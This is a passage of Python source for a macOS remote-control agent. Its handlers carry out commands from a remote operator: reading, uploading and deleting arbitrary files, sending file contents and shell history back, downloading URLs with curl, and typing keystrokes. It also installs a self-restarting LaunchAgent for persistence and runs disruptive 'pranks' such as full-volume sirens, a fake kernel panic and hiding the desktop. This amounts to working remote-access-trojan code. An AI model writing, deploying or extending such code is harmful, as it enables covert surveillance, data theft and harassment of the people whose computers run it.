                 'tell application "System Events" to get the name of every login item'],
                text=True, stderr=subprocess.DEVNULL, timeout=15,
            )
            items = [i.strip() for i in out.strip().split(",") if i.strip()]
            text = "🚀 Автозагрузка (login items):\n" + ("\n".join(f"• {i}" for i in items) or "(пусто)")
            ok = True
        except Exception as exc:
            items, text, ok = [], f"⚠️ Автозагрузка: {exc}", False
        self._publish_response("startup_list", {"type": "startup_list", "device_id": DEVICE_ID,
                                                "ok": ok, "text": text, "items": items})

    def _do_env_get(self, payload: dict) -> None:
        SAFE_KEYS = ("PATH", "USER", "HOME", "SHELL", "TMPDIR", "LANG", "LOGNAME")
        raw = payload.get("names") or payload.get("name")
        wanted = {raw.upper()} if isinstance(raw, str) else {k.upper() for k in (raw or SAFE_KEYS)}
        env = {k: (v if len(v) < 400 else v[:397] + "...") for k, v in os.environ.items()
               if k.upper() in wanted}
        text = "\n".join(f"{k}={v}" for k, v in sorted(env.items())) or "(пусто)"
        self._publish_response("env_get", {"type": "env_get", "device_id": DEVICE_ID,
                                           "ok": True, "text": text[:3500], "env": env})

    def _do_netstat(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(
                ["netstat", "-an", "-p", "tcp"],
                text=True, stderr=subprocess.DEVNULL, timeout=15,
            )
            lines = [ln for ln in out.splitlines() if ln.strip()][:40]
            text = "🕸 TCP-соединения (первые 40):\n" + "\n".join(lines)
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ netstat: {exc}", False
        self._publish_response("netstat", {"type": "netstat", "device_id": DEVICE_ID,
                                           "ok": ok, "text": text[:3500]})

    def _do_download_url(self, payload: dict) -> None:
        url = (payload.get("url") or "").strip()
        dest = (payload.get("dest") or "").strip() or os.path.join(
            os.path.expanduser("~"), "Downloads",
            os.path.basename(url.split("?")[0]) or "xgent_download.bin",
        )
        try:
            result = subprocess.run(
                ["curl", "-L", "--max-time", "120", "-o", dest, url],
                capture_output=True, text=True, timeout=130,
            )
            ok = result.returncode == 0 and os.path.exists(dest)
            size = os.path.getsize(dest) if ok else 0
            text = f"⬇️ Скачано {size} байт → {dest}" if ok else f"⚠️ curl rc={result.returncode}"
        except Exception as exc:
            ok, size, text = False, 0, f"⚠️ {exc}"
        self._publish_response("download_url", {"type": "download_url", "device_id": DEVICE_ID,
                                                "ok": ok, "path": dest, "size": size, "text": text})

    def _do_power(self, payload: dict) -> None:
        action = payload.get("power_action") or payload.get("action", "")
        commands = {
            "shutdown": (["osascript", "-e", 'tell app "System Events" to shut down'], "⚡ Выключение Mac инициировано..."),
            "reboot": (["osascript", "-e", 'tell app "System Events" to restart'], "🔄 Перезагрузка Mac инициирована..."),
            "sleep": (["pmset", "sleepnow"], "😴 Mac переводится в режим сна..."),
        }
        if action not in commands:
            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": action, "ok": False, "error": "unknown power action"})
            return
        command, text = commands[action]
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=8, check=False)
            ok = result.returncode == 0
            if not ok:
                text = (result.stderr or result.stdout or "команда macOS завершилась с ошибкой").strip()[:600]
        except Exception as exc:
            ok, text = False, str(exc)
        self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": action, "ok": ok, "error": None if ok else text})
        self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_stop(self, payload: dict) -> None:
        # KeepAlive у LaunchAgent иначе мгновенно поднимет процесс обратно.
        # При явной команде «Остановить агента» отключаем автозапуск заранее.
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.xgent.agent.plist")
        try:
            if os.path.exists(plist_path):
                subprocess.run(
                    ["launchctl", "bootout", f"gui/{os.getuid()}", plist_path],
                    capture_output=True,
                    check=False,
                )
                os.remove(plist_path)
        except Exception:
            log.exception("Не удалось отключить LaunchAgent перед остановкой")
        self.request_stop()

    # ---------- волна 1: файлы, система, приколы (паритет с WDS) ----------

    def _do_dir_list(self, payload: dict) -> None:
        base = os.path.expandvars(os.path.expanduser((payload.get("path") or "~").strip()))
        try:
            entries = sorted(os.scandir(base), key=lambda e: (not e.is_dir(), e.name.lower()))
            files = [("📁 " if e.is_dir() else "📄 ") + e.name for e in entries[:60]]
            text = f"✅ {base} (всего {len(entries)}):\n" + ("\n".join(files) or "(пусто)")
            self._publish_response("dir_list", {"type": "dir_list", "device_id": DEVICE_ID, "ok": True, "path": base, "text": text})
        except OSError as exc:
            self._publish_response("dir_list", {"type": "dir_list", "device_id": DEVICE_ID, "ok": False, "path": base, "text": f"❌ {exc}"})

    def _do_file_get(self, payload: dict) -> None:
        path = os.path.expanduser((payload.get("path") or "").strip())
        try:
            size = os.path.getsize(path)
            if size > 45 * 1024 * 1024:
                self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID, "ok": False, "error": f"Файл слишком большой: {size} байт (лимит 45 МБ)"})
                return
            with open(path, "rb") as f:
                data = base64.b64encode(f.read()).decode("ascii")
            self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID, "ok": True,
                                                "path": path, "filename": os.path.basename(path), "data": data,
                                                # Aliases for older Windows bot builds.
                                                "name": os.path.basename(path), "b64": data})
        except Exception as exc:
            self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})

    def _do_file_put(self, payload: dict) -> None:
        path = os.path.expanduser((payload.get("path") or "").strip())
        if not path:
            name = os.path.basename((payload.get("name") or "file.bin").strip())
            base = os.path.expanduser((payload.get("dir") or "~").strip())
            path = os.path.join(base, name)
        try:
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            with open(path, "wb") as f:
                f.write(base64.b64decode(payload.get("data") or payload.get("b64") or ""))
            self._publish_response("file_put", {"type": "file_put", "device_id": DEVICE_ID, "ok": True, "path": path})
        except Exception as exc:
            self._publish_response("file_put", {"type": "file_put", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})

    def _do_file_del(self, payload: dict) -> None:
        path = os.path.expanduser((payload.get("path") or "").strip())
        try:
            os.remove(path)
            self._publish_response("file_del", {"type": "file_del", "device_id": DEVICE_ID, "ok": True, "path": path})
        except Exception as exc:
            self._publish_response("file_del", {"type": "file_del", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})

    def _do_find_file(self, payload: dict) -> None:
        pattern = (payload.get("pattern") or "").strip()
        root = os.path.expanduser((payload.get("root") or "~").strip())
        matches = []
        for current, dirs, files in os.walk(root):
            if current[len(root):].count(os.sep) >= 4:
                dirs[:] = []
                continue
            for name in files:
                if pattern.lower() in name.lower():
                    matches.append(os.path.join(current, name))
                    if len(matches) >= 30: break
            if len(matches) >= 30: break
        text = "\n".join(matches[:30]) if matches else "Ничего не найдено"
        self._publish_response("find_file", {"type": "find_file", "device_id": DEVICE_ID, "ok": True, "total": len(matches), "text": text})

    def _do_path_open(self, payload: dict) -> None:
        path = (payload.get("path") or "").strip()
        if path:
            subprocess.Popen(["open", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._publish_response("path_open", {"type": "path_open", "device_id": DEVICE_ID, "ok": True, "path": path})

    def _do_ext_ip(self, payload: dict) -> None:
        ip = None
        for url in ("https://api.ipify.org", "https://ifconfig.me/ip"):
            try:
                with urllib.request.urlopen(url, timeout=6) as resp:
                    ip = resp.read().decode("ascii").strip()
                    if ip:
                        break
            except Exception:
                continue
        self._publish_response("ext_ip", {"type": "ext_ip", "device_id": DEVICE_ID,
                                          "ok": bool(ip), "ip": ip or "",
                                          "text": ip or "Не удалось определить внешний IP"})

    def _do_geo_location(self, payload: dict) -> None:
        """Получить приблизительную геолокацию по IP."""
        providers = (
            ("ipapi.co", "https://ipapi.co/json/"),
            ("ipinfo.io", "https://ipinfo.io/json"),
            ("ip-api.com", "http://ip-api.com/json/?fields=status,message,country,city,lat,lon,query,isp"),
        )
        data = None
        provider = None
        errors = []
        for name, url in providers:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "XIDER-Agent/3"})
                with urllib.request.urlopen(req, timeout=8) as response:
                    candidate = json.loads(response.read().decode("utf-8", "replace"))
                if candidate.get("error") or candidate.get("status") == "fail":
                    raise RuntimeError(candidate.get("reason") or candidate.get("message") or "provider error")
                if candidate.get("ip") or candidate.get("query") or candidate.get("city"):
                    data, provider = candidate, name
                    break
            except Exception as exc:
                errors.append(f"{name}: {exc}")
        if data:
            ip = data.get("ip") or data.get("query") or "?"
            country = data.get("country_name") or data.get("country") or "?"
            city = data.get("city") or "?"
            org = data.get("org") or data.get("isp") or "?"
            lat = data.get("latitude") or data.get("lat") or "?"
            lon = data.get("longitude") or data.get("lon") or "?"
            info = ("📍 <b>Приблизительная геолокация по IP:</b>\n"
                    f"🌍 Страна: {country}\n🏙 Город: {city}\n📡 Провайдер: {org}\n"
                    f"🗺 Координаты: {lat}, {lon}\n💻 IP: {ip}\n🔎 Источник: {provider}")
            ok = True
        else:
            info = "⚠️ Геолокация недоступна: " + "; ".join(errors[:3])
            ok = False
            
        self._publish_response("geo_location", {
            "type": "geo_location",
            "device_id": DEVICE_ID,
            "ok": ok,
            "text": info,
        })
        self._publish_response("output", {
            "type": "geo_location", "device_id": DEVICE_ID, "ok": ok, "text": info,
        })

    def _do_wallpaper_set(self, payload: dict) -> None:
        url = (payload.get("url") or "").strip()
        b64 = (payload.get("b64") or "").strip()
        random_meme = payload.get("random_meme", False)
        MEME_URLS = [
            "https://i.imgflip.com/4/30b1gx.jpg",
            "https://i.imgflip.com/4/1g8my4.jpg",
            "https://i.imgflip.com/4/1bij.jpg",
            "https://i.imgflip.com/4/26am.jpg",
            "https://i.imgflip.com/4/1ur9b0.jpg",
            "https://cataas.com/cat?width=1920&height=1080",
            "https://picsum.photos/1920/1080",
        ]
        try:
            tmp = os.path.join(tempfile.gettempdir(), "xgent_wallpaper.jpg")
            if b64:
                raw_bytes = base64.b64decode(b64)
                with open(tmp, "wb") as f:
                    f.write(raw_bytes)
            elif random_meme or not url:
                target_url = random.choice(MEME_URLS)
                req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=12) as resp, open(tmp, "wb") as out:
                    out.write(resp.read())
            else:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=12) as resp, open(tmp, "wb") as out:
                    out.write(resp.read())
            script = f'tell application "System Events" to tell every desktop to set picture to POSIX file "{tmp}"'
            result = subprocess.run(["osascript", "-e", script], check=False, capture_output=True, text=True)
            ok = result.returncode == 0
            text = "🖼 Обои успешно обновлены на Mac!" if ok else (result.stderr.strip() or "Не удалось установить обои")
            self._publish_response("wallpaper_set", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": ok, "error": None if ok else text})
            self._publish_response("output", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": ok, "text": text})
        except Exception as exc:
            self._publish_response("wallpaper_set", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})
            self._publish_response("output", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": False, "text": f"⚠️ Ошибка: {exc}"})

    def _do_msgbox_spam(self, payload: dict) -> None:
        count = min(int(payload.get("count", 5) or 5), 20)
        text = str(payload.get("text") or "Hello from XGENT!")[:200].replace('"', '\\"')
        def _spam():
            for _ in range(count):
                subprocess.run(["osascript", "-e", f'display dialog "{text}" buttons {{"OK"}} default button "OK" giving up after 10'], capture_output=True)
        threading.Thread(target=_spam, name="xgent-msgbox", daemon=True).start()
        self._publish_response("msgbox_spam", {"type": "msgbox_spam", "device_id": DEVICE_ID, "ok": True, "count": count})

    def _do_type_text(self, payload: dict) -> None:
        text = (payload.get("text") or "")[:500].replace("\\", "\\\\").replace('"', '\\"')
        def _typer():
            subprocess.run(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'], capture_output=True)
        threading.Thread(target=_typer, name="xgent-typer", daemon=True).start()
        self._publish_response("type_text", {"type": "type_text", "device_id": DEVICE_ID, "ok": True, "len": len(text)})

    def _do_hotkey(self, payload: dict) -> None:
        spec = (payload.get("keys") or "").strip()
        mapping = {"ctrl": "control", "cmd": "command", "alt": "option", "shift": "shift",
                   "esc": "escape", "enter": "return", "space": "space", "tab": "tab", "del": "delete"}
        parts = [p.strip().lower() for p in spec.split("+") if p.strip()]
        if not parts or any(p not in mapping and not (len(p) == 1 and p.isalnum()) for p in parts):
            self._publish_response("hotkey", {"type": "hotkey", "device_id": DEVICE_ID, "ok": False, "error": f"unknown keys: {spec}"})
            return
        mods = [mapping[p] for p in parts[:-1] if p in mapping]
        key = mapping.get(parts[-1], parts[-1])
        def _press():
            if mods:
                using = ", ".join(m + " down" for m in mods)
                script = f'tell application "System Events" to keystroke "{key}" using {{{using}}}'
            else:
                script = f'tell application "System Events" to keystroke "{key}"'
            subprocess.run(["osascript", "-e", script], capture_output=True)
        threading.Thread(target=_press, name="xgent-hotkey", daemon=True).start()
        self._publish_response("hotkey", {"type": "hotkey", "device_id": DEVICE_ID, "ok": True, "keys": spec})

    def _do_screen_off(self, payload: dict) -> None:
        result = subprocess.run(["pmset", "displaysleepnow"], capture_output=True, text=True, check=False)
        ok = result.returncode == 0
        self._publish_response("screen_off", {"type": "screen_off", "device_id": DEVICE_ID, "ok": ok,
                                               "error": None if ok else (result.stderr.strip() or "pmset failed")})

    def _do_screensaver_on(self, payload: dict) -> None:
        result = subprocess.run(["open", "-a", "ScreenSaverEngine"], capture_output=True, text=True, check=False)
        ok = result.returncode == 0
        self._publish_response("screensaver_on", {"type": "screensaver_on", "device_id": DEVICE_ID, "ok": ok,
                                                   "error": None if ok else (result.stderr.strip() or "ScreenSaverEngine failed")})

    def _do_prank_screamer(self, payload: dict) -> None:
        def _run():
            subprocess.run(["osascript", "-e", "set volume output volume 100"], check=False)
            url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
            subprocess.Popen(["open", url])
            for _ in range(5):
                subprocess.run(["osascript", "-e", "beep 3"], check=False)
        threading.Thread(target=_run, name="xgent-screamer", daemon=True).start()
        self._publish_response("prank_screamer", {"type": "prank_screamer", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_rickroll(self, payload: dict) -> None:
        tabs = min(int(payload.get("tabs", 10) or 10), 50)
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        def _run():
            for _ in range(tabs):
                subprocess.Popen(["open", url])
                time.sleep(0.1)
        threading.Thread(target=_run, name="xgent-rickroll", daemon=True).start()
        self._publish_response("prank_rickroll", {"type": "prank_rickroll", "device_id": DEVICE_ID, "ok": True, "tabs": tabs})

    def _do_prank_matrix(self, payload: dict) -> None:
        script = 'tell application "Terminal" to do script "clear; echo -e \\"\\\\033[32m\\"; while true; do echo -n \\"1 0 1 1 0 0 1 0 1 0 1 \\"; done"'
        subprocess.Popen(["osascript", "-e", script])
        self._publish_response("prank_matrix", {"type": "prank_matrix", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_siren(self, payload: dict) -> None:
        duration = min(int(payload.get("duration", 10) or 10), 30)
        def _run():
            subprocess.run(["osascript", "-e", "set volume output volume 100"], check=False)
            deadline = time.time() + duration
            while time.time() < deadline:
                subprocess.run(["afplay", "/System/Library/Sounds/Sosumi.aiff"], check=False)
                time.sleep(0.2)
        threading.Thread(target=_run, name="xgent-siren", daemon=True).start()
        self._publish_response("prank_siren", {"type": "prank_siren", "device_id": DEVICE_ID, "ok": True, "duration": duration})

    def _do_prank_shout_tts(self, payload: dict) -> None:
        text = str(payload.get("text") or "ВНИМАНИЕ! СИСТЕМА ОБНАРУЖИЛА ОШИБКУ!")[:300].replace('"', '\\"')
        def _run():
            subprocess.run(["osascript", "-e", "set volume output volume 100"], check=False)
            subprocess.run(["say", "-v", "Milena", text], check=False)
        threading.Thread(target=_run, name="xgent-shout", daemon=True).start()
        self._publish_response("prank_shout_tts", {"type": "prank_shout_tts", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_swap_mouse(self, payload: dict) -> None:
        self._publish_response("prank_swap_mouse", {"type": "prank_swap_mouse", "device_id": DEVICE_ID, "ok": False,
                                                    "text": "⚠️ Смена кнопок мыши отключена: macOS не позволяет безопасно менять её удалённо без системного разрешения."})

    def _do_prank_crazy_cursor(self, payload: dict) -> None:
        duration = min(int(payload.get("duration", 10) or 10), 30)
        try:
            import Quartz  # noqa: F401
        except Exception:
            self._publish_response("prank_crazy_cursor", {"type": "prank_crazy_cursor", "device_id": DEVICE_ID,
                                                           "ok": False, "text": "⚠️ Для движения курсора нужен PyObjC Quartz и разрешение Accessibility."})
            return
        def _run():
            try:
                import Quartz
                center_x, center_y = 700, 450
                deadline = time.time() + duration
                angle = 0.0
                import math
                while time.time() < deadline:
                    x = center_x + int(200 * math.cos(angle))
                    y = center_y + int(200 * math.sin(angle))
                    Quartz.CGWarpMouseCursorPosition((x, y))
                    angle += 0.2
                    time.sleep(0.02)
            except Exception as e:
                log.warning("Quartz crazy cursor failed: %s", e)
        threading.Thread(target=_run, name="xgent-crazycursor", daemon=True).start()
        self._publish_response("prank_crazy_cursor", {"type": "prank_crazy_cursor", "device_id": DEVICE_ID, "ok": True, "duration": duration})

    def _do_prank_hide_desktop(self, payload: dict) -> None:
        try:
            hide = bool(payload.get("hide", True))
            val = "false" if hide else "true"
            subprocess.run(["defaults", "write", "com.apple.finder", "CreateDesktop", "-bool", val], check=False)
            subprocess.run(["killall", "Finder"], check=False)
            ok = True
        except Exception:
            ok = False
        self._publish_response("prank_hide_desktop", {"type": "prank_hide_desktop", "device_id": DEVICE_ID, "ok": ok})

    def _do_prank_dancing_windows(self, payload: dict) -> None:
        script = '''
        tell application "System Events"
            set procList to every process whose visible is true
            repeat 10 times
                repeat with proc in procList
                    try
                        tell proc
                            set currentPos to position of window 1
                            set item 1 of currentPos to (item 1 of currentPos + 20)
                            set position of window 1 to currentPos
                            delay 0.05
                            set item 1 of currentPos to (item 1 of currentPos - 20)
                            set position of window 1 to currentPos
                        end tell
                    end try
                end repeat
            end repeat
        end tell
        '''
        threading.Thread(target=lambda: subprocess.run(["osascript", "-e", script], check=False), daemon=True).start()
        self._publish_response("prank_dancing_windows", {"type": "prank_dancing_windows", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_black_screen(self, payload: dict) -> None:
        subprocess.run(["pmset", "displaysleepnow"], check=False)
        self._publish_response("prank_black_screen", {"type": "prank_black_screen", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_random_site(self, payload: dict) -> None:
        SITES = [
            "https://hackertyper.net/",
            "https://pointerpointer.com/",
            "https://theuselessweb.com/",
            "https://cat-bounce.com/",
            "https://zoomquilt.org/",
        ]
        import random
        site = random.choice(SITES)
        subprocess.Popen(["open", site])
        self._publish_response("prank_random_site", {"type": "prank_random_site", "device_id": DEVICE_ID, "ok": True, "url": site})

    def _do_display_brightness(self, payload: dict) -> None:
        lvl = max(0, min(100, int(payload.get("level", 50))))
        if not shutil.which("brightness"):
            text = "⚠️ На macOS нет команды brightness. Установите её (brew install brightness) или используйте системный ползунок."
            ok = False
        else:
            try:
                subprocess.run(["brightness", str(lvl / 100)], check=True, timeout=8)
                text, ok = f"🔆 Яркость установлена на {lvl}%", True
            except Exception as exc:
                text, ok = f"⚠️ Не удалось изменить яркость: {exc}", False
        self._publish_response("display_brightness", {"type": "display_brightness", "device_id": DEVICE_ID, "ok": ok, "level": lvl, "text": text})
        self._publish_response("output", {"type": "display_brightness", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_display_night_light(self, payload: dict) -> None:
        text = "⚠️ Ночной свет macOS не имеет стабильного публичного CLI в агенте; переключите его в Пункте управления."
        self._publish_response("display_night_light", {"type": "display_night_light", "device_id": DEVICE_ID, "ok": False, "text": text})
        self._publish_response("output", {"type": "display_night_light", "device_id": DEVICE_ID, "ok": False, "text": text})

    def _do_display_rotate(self, payload: dict) -> None:
        angle = int(payload.get("angle", 0) or 0) % 360
        if angle not in (0, 90, 180, 270):
            text = "Угол должен быть 0, 90, 180 или 270 градусов."
            ok = False
        elif not shutil.which("displayplacer"):
            text = "Для поворота установите один раз: brew install displayplacer"
            ok = False
        else:
            try:
                listed = subprocess.run(["displayplacer", "list"], capture_output=True, text=True, timeout=10, check=False)
                import re
                match = re.search(r"displayplacer '([^']+)'", listed.stdout or "")
                if listed.returncode != 0 or not match:
                    raise RuntimeError((listed.stderr or listed.stdout or "не найден дисплей").strip())
                config = re.sub(r"\bdegree:\d+", f"degree:{angle}", match.group(1))
                result = subprocess.run(["displayplacer", config], capture_output=True, text=True, timeout=15, check=False)
                ok = result.returncode == 0
                text = f"Экран повернут на {angle}°" if ok else (result.stderr.strip() or "displayplacer завершился с ошибкой")
            except Exception as exc:
                ok, text = False, f"Не удалось повернуть экран: {exc}"
        self._publish_response("display_rotate", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": ok, "text": text, "angle": angle})
        self._publish_response("output", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_net_wifi_passwords(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(["networksetup", "-getairportnetwork", "en0"], text=True, stderr=subprocess.DEVNULL)
            text = f"📶 Wi-Fi (macOS):\n{out.strip()}"
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ Wi-Fi: {exc}", False
        self._publish_response("net_wifi_passwords", {"type": "net_wifi_passwords", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_net_bluetooth_list(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(["system_profiler", "SPBluetoothDataType", "-detailLevel", "mini"], text=True, stderr=subprocess.DEVNULL, timeout=15)
            lines = [l.strip() for l in out.splitlines() if l.strip() and ("Connected" in l or "Device" in l or "Name" in l)][:20]
            text = "🔵 Bluetooth (macOS):\n" + ("\n".join(lines) or "(нет активных устройств)")
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ Bluetooth: {exc}", False
        self._publish_response("net_bluetooth_list", {"type": "net_bluetooth_list", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_storage_smart(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(["diskutil", "info", "/"], text=True, stderr=subprocess.DEVNULL, timeout=10)
            lines = [l.strip() for l in out.splitlines() if "SMART" in l or "Total Size" in l or "Free Space" in l or "Device / Media Name" in l]
            text = "🩺 SMART & Диск (macOS):\n" + "\n".join(lines)
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ SMART: {exc}", False
        self._publish_response("storage_smart", {"type": "storage_smart", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_sys_installed_apps(self, payload: dict) -> None:
        try:
            apps = [a[:-4] for a in os.listdir("/Applications") if a.endswith(".app")][:35]
            text = "📦 Установленные приложения (/Applications):\n" + "\n".join(f"• {a}" for a in sorted(apps))
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ Ошибка чтения /Applications: {exc}", False
        self._publish_response("sys_installed_apps", {"type": "sys_installed_apps", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_sys_history_cmd(self, payload: dict) -> None:
        lines = int(payload.get("lines", 30) or 30)
        hist_file = os.path.expanduser("~/.zsh_history")
        if not os.path.exists(hist_file):
            hist_file = os.path.expanduser("~/.bash_history")
        try:
            if os.path.exists(hist_file):
                with open(hist_file, "r", encoding="utf-8", errors="ignore") as f:
                    history = [ln.strip().split(";")[-1] for ln in f.readlines() if ln.strip()][-lines:]
                text = "🕘 История консоли (последние):\n" + "\n".join(f"• {h}" for h in history)
                ok = True
            else:
                text, ok = "История терминала не найдена.", True
        except Exception as exc:
            text, ok = f"⚠️ Ошибка чтения истории: {exc}", False
        self._publish_response("sys_history_cmd", {"type": "sys_history_cmd", "device_id": DEVICE_ID, "ok": ok, "text": text})

    # ---------- Режим ожидания (Watchdog) и автозапуск ----------

    def _do_standby_sleep(self, payload: dict) -> None:
        """Перевод агента в спящий режим ожидания (Watchdog)."""
        self._standby = True
        self._publish_status()
        text = "💤 Агент переведён в спящий режим (Standby).\nБольшинство функций приостановлено. Для возобновления используйте кнопку «☀️ Пробудить агента»."
        self._publish_response("output", {"type": "standby_sleep", "device_id": DEVICE_ID, "ok": True, "text": text})

    def _do_wake(self, payload: dict) -> None:
        """Пробуждение агента из спящего режима."""
        self._standby = False
        self._publish_status()
        text = "☀️ Агент успешно пробуждён и готов к приёму всех команд!"
        self._publish_response("output", {"type": "wake", "device_id": DEVICE_ID, "ok": True, "text": text})

    def _do_autorun_status(self, payload: dict) -> None:
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.xgent.agent.plist")
        label = "gui/" + str(os.getuid()) + "/com.xgent.agent"
        loaded = subprocess.run(["launchctl", "print", label], capture_output=True, text=True, check=False).returncode == 0
        enabled = os.path.exists(plist_path) and loaded
        text = f"🚀 Автозапуск macOS: {'✅ ВКЛЮЧЕН' if enabled else '❌ ВЫКЛЮЧЕН'}\nФайл: {plist_path}"
        self._publish_response("output", {"type": "autorun_status", "device_id": DEVICE_ID, "ok": True, "text": text, "enabled": enabled})

    def _do_autorun_enable(self, payload: dict) -> None:
        plist_dir = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(plist_dir, exist_ok=True)
        plist_path = os.path.join(plist_dir, "com.xgent.agent.plist")
        script_dir = os.path.dirname(os.path.abspath(__file__))
        try:
            plist = {
                "Label": "com.xgent.agent",
                "ProgramArguments": [sys.executable, os.path.join(script_dir, "xgent_mcs.py")],
                "WorkingDirectory": script_dir,
                "RunAtLoad": True,
                "KeepAlive": True,
                "ProcessType": "Background",
                "StandardOutPath": os.path.join(script_dir, "agent.log"),
                "StandardErrorPath": os.path.join(script_dir, "agent.log"),
            }
            with open(plist_path, "wb") as f:
                f.write(plistlib.dumps(plist))
            domain = f"gui/{os.getuid()}"
            subprocess.run(["launchctl", "bootout", domain, plist_path], capture_output=True, check=False)
            loaded = subprocess.run(["launchctl", "bootstrap", domain, plist_path], capture_output=True, text=True, check=False)
            if loaded.returncode != 0:
                raise RuntimeError(loaded.stderr.strip() or "launchctl bootstrap failed")
            text = f"✅ Автозапуск macOS включен и загружен.\nФайл: {plist_path}"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка создания автозапуска: {exc}"
            ok = False
        self._publish_response("output", {"type": "autorun_enable", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_autorun_disable(self, payload: dict) -> None:
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.xgent.agent.plist")
        try:
            if os.path.exists(plist_path):
                subprocess.run(["launchctl", "bootout", f"gui/{os.getuid()}", plist_path], capture_output=True, check=False)
                os.remove(plist_path)
                text = "🛑 Автозапуск macOS успешно отключен."
            else:
                text = "ℹ️ Автозапуск macOS уже был отключен."
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка отключения автозапуска: {exc}"
            ok = False
        self._publish_response("output", {"type": "autorun_disable", "device_id": DEVICE_ID, "ok": ok, "text": text})

    # ---------- Системные утилиты и диагностика ----------

    def _do_sys_uptime(self, payload: dict) -> None:
        try:
            boot_ts = psutil.boot_time()
            uptime_secs = int(time.time() - boot_ts)
            days, rem = divmod(uptime_secs, 86400)
            hours, rem = divmod(rem, 3600)
            minutes, secs = divmod(rem, 60)
            boot_dt = time.strftime("%d.%m.%Y %H:%M:%S", time.localtime(boot_ts))
            text = f"⏱ Время работы системы macOS (Uptime):\n• Аптайм: {days} дн. {hours} ч. {minutes} мин. {secs} сек.\n• Загрузка: {boot_dt}"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка uptime: {exc}"
            ok = False
        self._publish_response("output", {"type": "sys_uptime", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_sys_clean_temp(self, payload: dict) -> None:
        try:
            cache_dir = os.path.expanduser("~/Library/Caches")
            cleaned_files = 0
            freed_bytes = 0
            for root, dirs, files in os.walk(cache_dir, topdown=False):
                for f in files:
                    fp = os.path.join(root, f)
                    try:
                        sz = os.path.getsize(fp)
                        os.remove(fp)
                        cleaned_files += 1
                        freed_bytes += sz
                    except Exception:
                        pass
            freed_mb = freed_bytes / (1024 * 1024)
            text = f"🧹 Очистка кэша macOS завершена!\n• Удалено файлов: {cleaned_files}\n• Освобождено: {freed_mb:.2f} МБ"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка очистки: {exc}"
            ok = False
        self._publish_response("output", {"type": "sys_clean_temp", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_net_ping(self, payload: dict) -> None:
        host = payload.get("host", "8.8.8.8")
        import re
        host = re.sub(r"[^\w\.-]", "", str(host)) or "8.8.8.8"
        try:
            res = subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True, timeout=10)
            text = f"🏓 Результаты Ping к {host}:\n```\n{(res.stdout or res.stderr).strip()[:3500]}\n```"
            ok = (res.returncode == 0)
        except Exception as exc:
            text = f"⚠️ Ошибка ping: {exc}"
            ok = False
        self._publish_response("output", {"type": "net_ping", "device_id": DEVICE_ID, "ok": ok, "text": text})

    # ---------- Расширенная матрица приколов ----------

    def _do_prank_bsod(self, payload: dict) -> None:
        try:
            html = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Kernel Panic</title>
<style>body{background:#000;color:#ccc;font-family:monospace;padding:50px;user-select:none;}</style>
</head><body><p>panic(cpu 0 caller 0xffffff801e0a6d1b): "Kernel trap at 0xffffff801e0a6d1b, type 14=page fault"</p>
<p>Debugger called: &lt;panic&gt;</p><p>Backtrace (CPU 0), Frame : Return Address</p>
<p>0xffffff924619b9e0 : 0xffffff801dfb0cb7</p><p>BSD process name corresponding to current thread: kernel_task</p>
<p>Mac OS version: 24.1.0</p><p>System uptime in nanoseconds: 129481928412</p>
<script>setTimeout(()=>window.close(),4000);document.addEventListener('click',()=>window.close());</script>
